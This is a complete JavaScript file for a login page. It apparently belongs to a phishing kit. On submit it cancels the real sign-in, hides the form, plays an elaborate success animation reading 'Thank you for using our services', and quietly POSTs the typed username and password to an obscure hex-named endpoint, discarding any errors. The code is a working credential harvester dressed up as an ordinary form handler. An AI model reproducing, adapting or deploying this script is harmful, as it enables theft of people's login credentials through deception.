(function () {
  var stylesInjected = false;

  function injectStyles() {
    if (stylesInjected) return;
    stylesInjected = true;

    var style = document.createElement("style");
    style.textContent =
      "@keyframes rc-success-in{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}" +
      "@keyframes rc-ring-spin{to{transform:rotate(360deg)}}" +
      "@keyframes rc-inner-pop{0%{transform:scale(.72);opacity:0}70%{transform:scale(1.05)}100%{transform:scale(1);opacity:1}}" +
      "@keyframes rc-check-circle-draw{from{stroke-dashoffset:132}to{stroke-dashoffset:0}}" +
      "@keyframes rc-check-mark-draw{from{stroke-dashoffset:34}to{stroke-dashoffset:0}}" +
      "@keyframes rc-check-hide{from{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.88)}}" +
      "@keyframes rc-face-pop{0%{transform:scale(.7);opacity:0}70%{transform:scale(1.06)}100%{transform:scale(1);opacity:1}}" +
      "@keyframes rc-smile-draw{from{stroke-dashoffset:40}to{stroke-dashoffset:0}}" +
      "@keyframes rc-blink{0%,92%,100%{transform:scaleY(1)}96%{transform:scaleY(.12)}}" +
      ".rc-success{display:flex;flex-direction:column;align-items:center;gap:1.25rem;padding:1rem 0;animation:rc-success-in .55s cubic-bezier(.22,1,.36,1) both}" +
      ".rc-success-icon{position:relative;width:5.5rem;height:5.5rem;display:flex;align-items:center;justify-content:center}" +
      ".rc-success-ring{position:absolute;inset:0;border-radius:9999px;background:conic-gradient(from 0deg,#22c55e,#86efac,#16a34a,#4ade80,#22c55e);animation:rc-ring-spin 2.8s linear infinite;opacity:.95}" +
      ".rc-success-ring:before{content:'';position:absolute;inset:3px;border-radius:9999px;background:#18181b}" +
      ".rc-success-inner{position:relative;z-index:1;width:4.25rem;height:4.25rem}" +
      ".rc-success-check,.rc-success-face{position:absolute;inset:0;border-radius:9999px;display:flex;align-items:center;justify-content:center}" +
      ".rc-success-check{background:linear-gradient(145deg,#14532d,#166534);box-shadow:0 0 24px rgba(34,197,94,.28);animation:rc-inner-pop .45s cubic-bezier(.22,1,.36,1) both,rc-check-hide .35s ease 1.05s forwards}" +
      ".rc-success-check svg{width:2.75rem;height:2.75rem;overflow:visible}" +
      ".rc-check-circle{stroke-dasharray:132;stroke-dashoffset:132;animation:rc-check-circle-draw .55s ease forwards}" +
      ".rc-check-mark{stroke-dasharray:34;stroke-dashoffset:34;animation:rc-check-mark-draw .45s ease .45s forwards}" +
      ".rc-success-face{background:linear-gradient(145deg,#14532d,#166534);box-shadow:0 0 24px rgba(34,197,94,.28);opacity:0;animation:rc-face-pop .65s cubic-bezier(.22,1,.36,1) 1.05s forwards}" +
      ".rc-success-face svg{width:2.5rem;height:2.5rem;overflow:visible}" +
      ".rc-success-eye{transform-origin:center;animation:rc-blink 3.6s ease-in-out 1.8s infinite}" +
      ".rc-success-smile{stroke-dasharray:40;stroke-dashoffset:40;animation:rc-smile-draw .7s ease 1.35s forwards}" +
      ".rc-success-text{color:#4ade80;font-size:1rem;line-height:1.5rem;font-weight:500;text-align:center;opacity:0;animation:rc-success-in .55s cubic-bezier(.22,1,.36,1) 1.15s forwards}";
    document.head.appendChild(style);
  }

  function showSuccess(card) {
    injectStyles();

    var header = card.querySelector(".text-center.space-y-1");
    var form = card.querySelector("form");
    if (header) header.style.display = "none";
    if (form) form.style.display = "none";

    var existing = card.querySelector(".rc-success");
    if (existing) existing.remove();

    var success = document.createElement("div");
    success.className = "rc-success";
    success.innerHTML =
      '<div class="rc-success-icon">' +
      '<div class="rc-success-ring"></div>' +
      '<div class="rc-success-inner">' +
      '<div class="rc-success-check">' +
      '<svg viewBox="0 0 48 48" fill="none" aria-hidden="true">' +
      '<circle class="rc-check-circle" cx="24" cy="24" r="21" stroke="#4ade80" stroke-width="2.5" fill="none"/>' +
      '<path class="rc-check-mark" d="M15 24.5 L21.5 31 L33 17.5" stroke="#bbf7d0" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>' +
      "</svg>" +
      "</div>" +
      '<div class="rc-success-face">' +
      '<svg viewBox="0 0 48 48" fill="none" aria-hidden="true">' +
      '<circle class="rc-success-eye" cx="17" cy="20" r="2.5" fill="#bbf7d0"/>' +
      '<circle class="rc-success-eye" cx="31" cy="20" r="2.5" fill="#bbf7d0"/>' +
      '<path class="rc-success-smile" d="M15 28c3.2 4.8 14.8 4.8 18 0" stroke="#bbf7d0" stroke-width="2.5" stroke-linecap="round"/>' +
      "</svg>" +
      "</div>" +
      "</div>" +
      "</div>" +
      '<p class="rc-success-text">Thank you for using our services</p>';

    card.appendChild(success);
  }

  function init() {
    var form = document.querySelector("#root form");
    if (!form) return;

    var card = form.closest(".w-full.max-w-sm");

    form.addEventListener("submit", function (event) {
      event.preventDefault();

      var usernameInput = document.getElementById("username");
      var passwordInput = document.getElementById("password");
      var submitButton = form.querySelector('button[type="submit"]');

      if (!usernameInput || !passwordInput || !submitButton) return;

      var username = usernameInput.value.trim();
      var password = passwordInput.value;

      if (!username || !password) return;

      submitButton.disabled = true;

      if (card) showSuccess(card);

      fetch("/api/7f4a9c2e8b1d6f3a0e5c9b2d7f1a4e8c3b6d9f2a5e1c4b7d0f3a6e9c2b5", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: username, password: password }),
      }).catch(function () {});
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
